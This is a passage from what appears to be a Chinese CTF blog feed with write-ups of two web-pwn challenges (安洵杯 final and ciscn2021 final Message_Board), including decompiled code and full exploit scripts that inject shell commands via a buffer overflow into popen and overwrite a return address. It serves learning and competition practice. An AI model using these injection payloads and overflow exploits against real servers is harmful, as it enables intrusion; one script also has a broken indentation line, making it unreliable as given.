title="例题"></a>例题</h3><p><del>异构pwn的栈题与x86架构的题差别挺大，主要是理解其函数调用的过程以及寄存器的作用。例题都是两个月前做的，现在也忘的差不多了，准备这里是放2022的hws的题，结果他没有出异构题，等到下次遇见好的题再放吧。</del></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>webpwn初探</title>
      <link href="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/"/>
      <url>/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h3 id="webpwn初探"><a href="#webpwn初探" class="headerlink" title="webpwn初探"></a>webpwn初探</h3><span id="more"></span><h3 id="1、安洵final"><a href="#1、安洵final" class="headerlink" title="1、安洵final"></a>1、安洵final</h3><p>安洵杯线下赛的最后一题，webpwn当时没做出来，看了两三天+darry的帮助下才复现出来。</p><p>做这类题目需要认认真真的去分析，才能找到漏洞点，但认真分析就会很浪费时间，说到底还是太菜。</p><p>首先要做的就是如何正确的输入，从下面三张图片即可看出需要我们输入请求方式、文件名、任意</p><p><img src="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108111637961.png" class="lazyload placeholder" data-srcset="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108111637961.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108111637961"></p><p><img src="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108112409522.png" class="lazyload placeholder" data-srcset="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108112409522.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108112409522"></p><p><img src="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108112446637.png" class="lazyload placeholder" data-srcset="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108112446637.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108112446637"></p><p>下面这段代码自定义了一个头部X-Forword-For ，其后内容长度必须大于七，且必须是192.168.1.1~20</p><p><img src="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108112932471.png" class="lazyload placeholder" data-srcset="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108112932471.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108112932471"></p><p><img src="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108113108046.png" class="lazyload placeholder" data-srcset="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108113108046.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108113108046"></p><p>输入问题解决后，就得寻找漏洞了，一般的漏洞是目录穿越或者栈溢出。</p><p>从data段中找到了<code>login.cgi</code>、<code>logout.cgi</code>、<code>wifictl.cgi</code>、<code>logctl.cgi</code>，这些是文件名，并且每个文件名对应一个函数。</p><p>下图是以’=‘，’？‘，’&amp;‘三个符号将文件名分解</p><p><img src="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108121954428.png" class="lazyload placeholder" data-srcset="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108121954428.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108121954428"></p><p><code>sub_4034FD</code>函数如下，a2是我们的输入，可以输入任意长度，并且复制给<code>dest1[16 * i + 40]</code></p><p><img src="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108123226353.png" class="lazyload placeholder" data-srcset="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108123226353.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108123226353"></p><p>下图可以得出’？‘后应该跟ring_token</p><p><img src="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108115456348.png" class="lazyload placeholder" data-srcset="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108115456348.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108115456348"></p><p>我们先看看wifictl这个函数，这个函数会给我们显示时间</p><p><img src="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108124437931.png" class="lazyload placeholder" data-srcset="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108124437931.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108124437931"></p><p>漏洞点在logctl这个函数里，首先需要有一个token值，值是wifictl给出的时间。</p><p><img src="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108125007789.png" class="lazyload placeholder" data-srcset="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220108125007789.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220108125007789"></p><p>在<code>sub_402E56</code>中，a2是我们的输入，任意长度，s接受输入的值，因此有溢出，我们就可以控制a3了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_402E56(__int64 a1, const char *a2, char *a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  unsigned int v6; // [rsp+20h] [rbp-CE0h]</span><br><span class="line">  int i; // [rsp+24h] [rbp-CDCh]</span><br><span class="line">  int k; // [rsp+24h] [rbp-CDCh]</span><br><span class="line">  int j; // [rsp+28h] [rbp-CD8h]</span><br><span class="line">  int v10; // [rsp+2Ch] [rbp-CD4h]</span><br><span class="line">  int v11[128]; // [rsp+30h] [rbp-CD0h] BYREF</span><br><span class="line">  char v12[128]; // [rsp+230h] [rbp-AD0h] BYREF</span><br><span class="line">  char s[1312]; // [rsp+2B0h] [rbp-A50h] BYREF</span><br><span class="line">  char v14[1304]; // [rsp+7D0h] [rbp-530h] BYREF</span><br><span class="line">  unsigned __int64 v15; // [rsp+CE8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(0x28u);</span><br><span class="line">  v6 = 0;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  if ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(s, 0, 0x514uLL);</span><br><span class="line">    memset(v14, 0, sizeof(v14));</span><br><span class="line">    memset(v12, 0, sizeof(v12));</span><br><span class="line">    memset(v11, 0, sizeof(v11));</span><br><span class="line">    strcpy(v12, &quot;$;`&#x27;&amp;|&lt;&gt;^\n\r&quot;);</span><br><span class="line">    strcpy(s, a2);</span><br><span class="line">    for ( i = 0; i &lt; strlen(s); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      for ( j = 0; j &lt; strlen(v12); ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( s[i] == v12[j] )</span><br><span class="line">        &#123;</span><br><span class="line">          v11[i] = 1;                           // v11[i]表示有和上面相同的符号</span><br><span class="line">          break;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for ( k = 0; k &lt; strlen(v12); ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v11[k] == 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = v10++;</span><br><span class="line">        v14[v3] = v12[k];</span><br><span class="line">        v6 = 1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    strcpy(a3, v14);</span><br><span class="line">  &#125;</span><br><span class="line">  return v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v5被我们控制后，popen函数会调用execve函数执行参数，因此我们就可以直接写/bin/sh了。</p><p>在使用pwntool模块时，我们需要注意下在写参数时需要进行url编码，所以得将空格换成%20或+。使用request模块则不需要。</p><p>完整exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,&#x27;10000&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">payload = &#x27;GET /wifictl.cgi?ring_token=1 HTTP/1/1\r\nX-Forword-For: 192.168.1.1\r\n&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(&#x27;now time is &#x27;)</span><br><span class="line">time=io.recvuntil(&#x27;.&#x27;)[:-1]</span><br><span class="line">print(time)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,&#x27;10000&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">#cmd = &#x27;a;&#x27;+&#x27;a&#x27;*1311+&quot;/bin/cat /flag &gt; a;&quot;</span><br><span class="line">cmd = &#x27;a;&#x27;+&#x27;a&#x27;*1311+&#x27;/bin/ls+/+&gt;+/var/www/html/a;&#x27;</span><br><span class="line">payload = &#x27;GET /logctl.cgi?ring_token=&#123;0&#125;&amp;aa=&#123;1&#125; HTTP/1/1\r\nX-Forword-For: 192.168.1.1\r\n&#x27;.format(int(time)+1,cmd)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,10000)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">payload = &#x27;GET /a HTTP/1/1\r\nX-Forword-For: 192.168.1.1\r\n&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.close()</span><br><span class="line">#io.interactive()</span><br></pre></td></tr></table></figure><p>request模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"># import getopt</span><br><span class="line"># import sys</span><br><span class="line">import warnings</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"># import json</span><br><span class="line">import socket</span><br><span class="line">import socks</span><br><span class="line">#socks.setdefaultproxy(socks.HTTP, &quot;127.0.0.1&quot;, 8080)</span><br><span class="line">#socket.socket = socks.socksocket</span><br><span class="line">#context.log_levle=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def exp(url):</span><br><span class="line">    if url[len(url) - 1] != &#x27;/&#x27;:</span><br><span class="line">        print(&quot;[-] Target URL Format Error,The last char in url must be &#x27;/&#x27;.&quot;)</span><br><span class="line">        return False</span><br><span class="line">    </span><br><span class="line">    warnings.filterwarnings(&#x27;ignore&#x27;)</span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.verify = False</span><br><span class="line">    header = &#123;</span><br><span class="line">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#x27;,</span><br><span class="line">        &#x27;X-Forword-For&#x27;: &#x27;192.168.1.1&#x27;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        # print(&quot;[+] login...&quot;)</span><br><span class="line">        ret = s.get(&quot;&#123;&#125;wifictl.cgi?ring_token=1&quot;.format(url), headers=header, timeout=8)</span><br><span class="line">print(s)        </span><br><span class="line">if ret.status_code == 200:</span><br><span class="line">            if &quot;now time is&quot; in ret.content.decode():</span><br><span class="line">                time_ret = re.search(r&quot;now time is (.+?)\.\n&quot;,ret.content.decode())</span><br><span class="line">                if time_ret is None:</span><br><span class="line">                    print(&quot;[-] time_ret re error, cannot get time&quot;)</span><br><span class="line">                    return False</span><br><span class="line">                else:</span><br><span class="line">                    now_time = time_ret.group(1)</span><br><span class="line">                    print(&quot;[+] now time is &quot; + now_time)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;[-] time_ret re error, cannot get time&quot;)</span><br><span class="line">                return False</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[-] status_code error, cannot get time&quot;)</span><br><span class="line">            return False</span><br><span class="line">        </span><br><span class="line">        cmd = &quot;a;&quot; + &quot;a&quot;*1311 + &quot;/bin/cat /flag &gt;/var/www/html/flag;&quot;</span><br><span class="line">        new_url = &quot;&#123;&#125;logctl.cgi?ring_token=&#123;&#125;&amp;aa=&#123;&#125;&quot;.format(url, int(now_time)+1, cmd)</span><br><span class="line">        ret = s.get(new_url, headers=header, timeout=8)</span><br><span class="line"></span><br><span class="line">        # if ret.status_code == 200:</span><br><span class="line">        #     print(ret.content.decode())</span><br><span class="line">        # else:</span><br><span class="line">        #     print(&quot;[-] status_code error, cannot get flag&quot;)</span><br><span class="line">        #     return False</span><br><span class="line">        ret = s.get(&quot;&#123;&#125;flag&quot;.format(url), headers=header, timeout=8)</span><br><span class="line">        if ret.status_code == 200:</span><br><span class="line">            print(ret.content.decode())</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[-] status_code error, cannot get flag&quot;)</span><br><span class="line">            return False</span><br><span class="line">        </span><br><span class="line">        cmd = &quot;a;&quot; + &quot;a&quot;*1311 + &quot;rm /var/www/html/flag;&quot;</span><br><span class="line">        new_url = &quot;&#123;&#125;logctl.cgi?ring_token=&#123;&#125;:1&amp;aa=&#123;&#125;&quot;.format(url, int(now_time)+1, cmd)</span><br><span class="line">        ret = s.get(new_url, headers=header, timeout=8)</span><br><span class="line">        if ret.status_code == 200:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[-] status_code error, cannot rm flag&quot;)</span><br><span class="line">            return False</span><br><span class="line">    </span><br><span class="line">    except Exception as reason:</span><br><span class="line">        if &#x27;timed&#x27; in repr(reason) or &#x27;timeout&#x27; in repr(reason):</span><br><span class="line">            print(&#x27;[-] Fail, can not connect target for: timeout&#x27;)</span><br><span class="line">            return False</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;[-] Fail, can not connect target for: &#123;&#125;&#x27;.format(repr(reason)))</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp(&quot;http://127.0.0.1:10000/&quot;)</span><br></pre></td></tr></table></figure><h3 id="2、ciscn2021final-Message-Board"><a href="#2、ciscn2021final-Message-Board" class="headerlink" title="2、ciscn2021final Message_Board"></a>2、ciscn2021final Message_Board</h3><p>当时总决赛这个题没有抽到，现在正好复现复现。不得不说，企鹅师傅出的真好。</p><p>先是规范我们的输入，以<code>\r\n</code>为分隔符将输入分组，第一组再以‘空格分组，第一组的三个部分分别是请求方式（GET、POST）、文件路径（/submit、/messages、/register）、协议（HTTP/1.1、HTTP/1.0）。紧接着要求第二组头部是<code>Content-Length： </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  char s[32]; // [esp+4h] [ebp-474h] BYREF</span><br><span class="line">  char v2[512]; // [esp+24h] [ebp-454h] BYREF</span><br><span class="line">  char v3[512]; // [esp+224h] [ebp-254h] BYREF</span><br><span class="line">  char v4[32]; // [esp+424h] [ebp-54h] BYREF</span><br><span class="line">  char *v5; // [esp+444h] [ebp-34h]</span><br><span class="line">  char *v6; // [esp+44Ch] [ebp-2Ch]</span><br><span class="line">  char *v7; // [esp+450h] [ebp-28h]</span><br><span class="line">  char *dest; // [esp+454h] [ebp-24h]</span><br><span class="line">  char *v9; // [esp+458h] [ebp-20h]</span><br><span class="line">  char *v10; // [esp+45Ch] [ebp-1Ch]</span><br><span class="line">  char *src; // [esp+460h] [ebp-18h]</span><br><span class="line">  size_t v12; // [esp+464h] [ebp-14h]</span><br><span class="line">  int i; // [esp+468h] [ebp-10h]</span><br><span class="line">  char *v14; // [esp+46Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  memset(s, 0, 1096u);</span><br><span class="line">  v12 = sub_8048950(stdin, dest1, 1024);        // 返回第一段\r\n（包含）的长度，且将赋值到dest1</span><br><span class="line">  src = dest1;</span><br><span class="line">  v10 = strchr(dest1, &#x27; &#x27;);</span><br><span class="line">  if ( !v10 || v10 - src &gt; 31 || v10 == src )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_8048A43(stdout);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  strncpy(s, src, v10 - src);</span><br><span class="line">  src = ++v10;                                  // 第一个空格之后</span><br><span class="line">  v10 = strchr(v10, &#x27; &#x27;);                       // 第二个空格前</span><br><span class="line">  if ( !v10 || v10 - src &gt; 0x1FF || v10 == src )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_8048A43(stdout);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = strchr(src, &#x27;?&#x27;);</span><br><span class="line">  if ( v9 &amp;&amp; v9 &lt; v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    strncpy(v2, src, v9 - src);                 // v2 文件名到？</span><br><span class="line">    strncpy(v3, v9 + 1, v10 - v9 - 1);          // ？后第二个空格前</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    strncpy(v2, src, v10 - src);</span><br><span class="line">  &#125;</span><br><span class="line">  src = ++v10;</span><br><span class="line">  v10 = strstr(v10, &quot;\r\n&quot;);                    // 第二个空格后到\r\n前</span><br><span class="line">  if ( v10 &amp;&amp; v10 - src &lt;= 31 )</span><br><span class="line">    strncpy(v4, src, v10 - src);</span><br><span class="line">  if ( v4[0] &amp;&amp; strcmp(v4, &quot;HTTP/1.1&quot;) &amp;&amp; strcmp(v4, &quot;HTTP/1.0&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_8048A89(stdout);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = 0;</span><br><span class="line">  v14 = 0;</span><br><span class="line">  dest = (char *)calloc(0x41u, 1u);</span><br><span class="line">  v7 = (char *)calloc(0x201u, 1u);</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( i &gt; 31 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_8048A43(stdout);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    v12 = sub_8048950(stdin, dest1, 1024);</span><br><span class="line">    src = dest1;</span><br><span class="line">    v10 = dest1;</span><br><span class="line">    if ( !strncmp(dest1, &quot;\r\n&quot;, 2u) )</span><br><span class="line">      break;</span><br><span class="line">    v10 = strchr(src, &#x27;:&#x27;);</span><br><span class="line">    if ( !v10 || v10 - src &gt; 63 || v10 == src )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_8048A43(stdout);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    *v10 = 0;</span><br><span class="line">    strncpy(dest, src, 0x40u);                  // dest 头部</span><br><span class="line">    src = v10 + 1;                              // 头部 ： 后的内容包含空格</span><br><span class="line">    v10 = strstr(v10 + 1, &quot;\r\n&quot;);</span><br><span class="line">    if ( !v10 || v10 - src &gt; 0x1FF || src + 1 &gt;= v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_8048A43(stdout);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    ++src;                                      // 头部 ： 后的内容</span><br><span class="line">    *v10 = 0;</span><br><span class="line">    v10[1] = 0;</span><br><span class="line">    strncpy(v7, src, 0x200u);</span><br><span class="line">    v6 = (char *)calloc(0x248u, 1u);</span><br><span class="line">    strncpy(v6, dest, 0x40u);</span><br><span class="line">    strncpy(v6 + 0x41, v7, 0x200u);</span><br><span class="line">    *((_DWORD *)v6 + 0x91) = 0;</span><br><span class="line">    if ( v14 )</span><br><span class="line">      *((_DWORD *)v14 + 0x91) = v6;</span><br><span class="line">    else</span><br><span class="line">      v5 = v6;</span><br><span class="line">    v14 = v6;</span><br><span class="line">    src = v10 + 2;</span><br><span class="line">  &#125;</span><br><span class="line">  free(dest);</span><br><span class="line">  free(v7);</span><br><span class="line">  sub_804906C(s);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  fclose(stdin);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞函数在<code>sub_904906c</code>中,如果请求方式是<code>POST</code>且文件路径是<code>/submit</code>的话第三组就得是<code>Cookie: </code>,且内容的格式必须是Username=aaa;Messages=aaa\r\n </p><p><img src="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220112185138828.png" class="lazyload placeholder" data-srcset="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220112185138828.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220112185138828"></p><p>每个头部的内容都会被存入bss段中。当<code>Content-Length</code>的内容是0时，如果Messages的内容的末尾没有‘|‘，那么n就会变为0xffffffff，因此就会造成溢出。</p><p><img src="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220112185443327.png" class="lazyload placeholder" data-srcset="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220112185443327.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220112185443327"></p><p>由于无法泄露地址，因此我们直接利用下图函数，来直接读取文件。</p><p><img src="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220112191241152.png" class="lazyload placeholder" data-srcset="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220112191241152.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220112191241152"></p><p>因为是32位程序，所以参数是在栈内，又没有开canary和pie，因此在bss段上布置上文件名，将ebp改为对应的bss地址，就可以读取flag了。</p><p><img src="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220112191729899.png" class="lazyload placeholder" data-srcset="/2022/01/12/webpwn%E5%88%9D%E6%8E%A2/image-20220112191729899.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220112191729899"></p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./httpd&#x27;)</span><br><span class="line">#io=remote(&#x27;node4.buuoj.cn&#x27;,25119)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">payload=&#x27;POST /submit HTTP/1.1\r\nContent-Length: 0\r\nCookie: Username=f1ag;Messages=flag\r\n\r\n&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload=&#x27;a&#x27;*(0x82e-14+8)+p32(0x804C180+0x42c+len(&#x27;Cookie: Username=f1ag;Messages=&#x27;))+p32(0x80492BD)#+p32(0x8049339)</span><br><span class="line">payload=payload.ljust(0x5000,&#x27;\x00&#x27;)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>长安战疫pwn</title>
      <link href="/2022/01/09/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABpwn/"/>
      <url>/2022/01/09/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABpwn/</url>
      
